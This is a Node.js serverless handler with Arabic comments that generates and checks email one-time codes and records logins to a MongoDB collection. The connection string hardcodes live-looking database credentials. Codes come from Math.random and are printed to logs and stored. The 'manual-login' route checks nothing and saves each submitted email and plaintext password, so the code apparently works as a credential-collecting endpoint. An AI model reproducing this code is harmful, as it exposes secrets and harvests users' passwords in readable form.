const mongoose = require('mongoose');

// الاتصال بقاعدة البيانات مونجو (يتم مرة واحدة عند استدعاء الدالة)
const mongoURI = process.env.MONGO_URI || "mongodb+srv://kuroma:kuroma2026@cluster0.onw6b.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
if (mongoose.connection.readyState === 0) {
    mongoose.connect(mongoURI).catch(err => console.log('MongoDB Error:', err));
}

const LogSchema = new mongoose.Schema({
    email: String,
    action: String,
    details: String,
    timestamp: { type: Date, default: Date.now }
});
const AccessLog = mongoose.models.AccessLog || mongoose.model('AccessLog', LogSchema);

// مخزن مؤقت للأكواد (ملاحظة: في بيئة Serverless قد يضيع الكود إذا نمت الدالة، ولكن للتجربة الفورية سيعمل)
// للضمان الكامل، السيرفر يطبع الكود دائماً في الـ Logs
global.activeOtps = global.activeOtps || new Map();

module.exports = async (req, res) => {
    // إعدادات CORS يدوياً لضمان عدم حجب الطلبات
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const url = req.url;

    // 1. مسار إرسال كود التحقق
    if (url.includes('send-code') && req.method === 'POST') {
        const { email } = req.body;
        if (!email) return res.status(400).json({ error: "البريد مطلوب" });

        const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
        global.activeOtps.set(email, generatedOtp);
        
        console.log(`[OTP Generated] Email: ${email} | Code: ${generatedOtp}`);

        try {
            await AccessLog.create({ email, action: "OTP_REQUESTED", details: `كود التحقق الناتج: ${generatedOtp}` });
            return res.status(200).json({ success: true });
        } catch (err) {
            return res.status(500).json({ error: "خطأ في قاعدة البيانات" });
        }
    }

    // 2. مسار التحقق من الكود
    if (url.includes('verify-code') && req.method === 'POST') {
        const { email, code } = req.body;
        const savedCode = global.activeOtps.get(email);

        if (savedCode && savedCode === code) {
            global.activeOtps.delete(email);
            try {
                await AccessLog.create({ email, action: "OTP_VERIFIED", details: "تم التحقق بنجاح" });
                return res.status(200).json({ success: true });
            } catch(e) {
                return res.status(200).json({ success: true });
            }
        } else {
            return res.status(400).json({ error: "الكود غير صحيح" });
        }
    }

    // 3. مسار حفظ باسوورد الأداة والتوثيق
    if (url.includes('manual-login') && req.method === 'POST') {
        const { email, password } = req.body;
        try {
            await AccessLog.create({ email, action: "LOGIN_SUCCESS", details: `الباسوورد المستخدم: ${password}` });
            return res.status(200).json({ success: true });
        } catch (err) {
            return res.status(500).json({ error: "فشل حفظ البيانات" });
        }
    }

    return res.status(404).json({ error: "المسار غير موجود" });
};
